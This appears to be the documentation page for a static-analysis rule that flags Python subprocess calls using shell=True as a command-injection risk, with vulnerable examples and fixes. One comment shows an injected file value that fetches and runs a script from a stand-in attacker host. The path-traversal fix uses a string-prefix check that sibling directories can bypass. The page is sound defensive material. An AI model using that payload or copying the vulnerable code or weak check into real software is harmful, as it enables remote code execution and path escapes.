---
title: "VNX-PY-007 – subprocess with shell=True"
description: "Detect subprocess calls that use shell=True, which passes the command through the system shell and enables command injection when any part of the command string is user-controlled."
---

## Overview

This rule flags calls to `subprocess.call()`, `subprocess.run()`, `subprocess.Popen()`, `subprocess.check_call()`, and `subprocess.check_output()` that include `shell=True`. When `shell=True` is set, Python passes the entire command to `/bin/sh -c` (on Unix) or `cmd.exe /c` (on Windows) rather than executing the binary directly. This means the shell interprets the command string, processing metacharacters such as `;`, `&&`, `||`, `|`, `$()`, and backticks. If any part of the command string is derived from user input, the attacker can inject additional shell commands. This maps to [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html).

**Severity:** High | **CWE:** [CWE-78 – OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

## Why This Matters

Command injection via `shell=True` is one of the most impactful vulnerability classes in web applications. The attacker gains the ability to run arbitrary OS commands with the same privileges as the Python process. In a typical deployment this means reading application secrets, exfiltrating database contents, modifying files, pivoting to adjacent services on the internal network, or establishing a reverse shell.

Developers use `shell=True` for convenience — it allows shell features like globbing, pipes, and environment variable expansion in a single string. But the same parsing that makes those features work will also parse an attacker's injected metacharacters. Sanitising user input to remove metacharacters is not a reliable defence because the set of dangerous characters is large and context-dependent (differ between shells, quoting styles, and encoding schemes).

## What Gets Flagged

Any subprocess call with `shell=True` anywhere on the same line.

```python
# FLAGGED: user-controlled filename passed through shell
filename = request.args.get("file")
subprocess.run(f"cat {filename}", shell=True)
# Attacker sends file=foo; curl https://evil.example/shell | bash

# FLAGGED: even with seemingly static input, shell=True is flagged
subprocess.call("ls -la /tmp", shell=True)

# FLAGGED: Popen with shell=True
proc = subprocess.Popen(f"convert {input_file} output.png", shell=True)

# FLAGGED: check_output with shell=True
result = subprocess.check_output(f"grep {pattern} {logfile}", shell=True)
```

## Remediation

1. **Pass a list of arguments with `shell=False` (the default).** This bypasses the shell entirely. Python calls `execve()` directly with the program path and an argument vector, so no shell metacharacter parsing occurs. The user-supplied values are passed as arguments to the program, not interpreted by a shell:

```python
import subprocess

# SAFE: list form — shell metacharacters in filename are passed as literals
filename = request.args.get("file")
result = subprocess.run(
    ["cat", filename],
    capture_output=True,
    text=True,
    check=True,
)
```

2. **Validate and restrict input before passing to subprocess.** Even with `shell=False`, validate that the argument is within expected bounds. For file paths, resolve them and confirm they are within an allowed directory:

```python
import subprocess
from pathlib import Path

ALLOWED_DIR = Path("/var/app/uploads").resolve()

def process_file(user_path: str) -> str:
    # Resolve and confirm the path stays within the allowed directory
    target = (ALLOWED_DIR / user_path).resolve()
    if not str(target).startswith(str(ALLOWED_DIR)):
        raise ValueError("Path traversal detected")
    result = subprocess.run(
        ["file", str(target)],
        capture_output=True,
        text=True,
        check=True,
    )
    return result.stdout
```

3. **Use Python standard library functions instead of shell commands.** Many common shell command patterns have direct Python equivalents that are safer and more portable:

```python
from pathlib import Path
import shutil

# Instead of: subprocess.run("cat file.txt", shell=True)
content = Path("file.txt").read_text()

# Instead of: subprocess.run("cp src dst", shell=True)
shutil.copy("src", "dst")

# Instead of: subprocess.run("rm -rf tmpdir", shell=True)
shutil.rmtree("tmpdir")
```

4. **If you need shell features like pipes, use Python's subprocess plumbing.** Chain `subprocess.run` calls or use `subprocess.PIPE` to compose pipelines without invoking a shell:

```python
# Instead of: subprocess.run("ps aux | grep python", shell=True)
ps = subprocess.run(["ps", "aux"], capture_output=True, text=True)
grep = subprocess.run(["grep", "python"], input=ps.stdout, capture_output=True, text=True)
```

## References

- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [Python docs – subprocess security considerations](https://docs.python.org/3/library/subprocess.html#security-considerations)
- [CAPEC-88: OS Command Injection](https://capec.mitre.org/data/definitions/88.html)
- [MITRE ATT&CK T1059.006 – Command and Scripting Interpreter: Python](https://attack.mitre.org/techniques/T1059/006/)
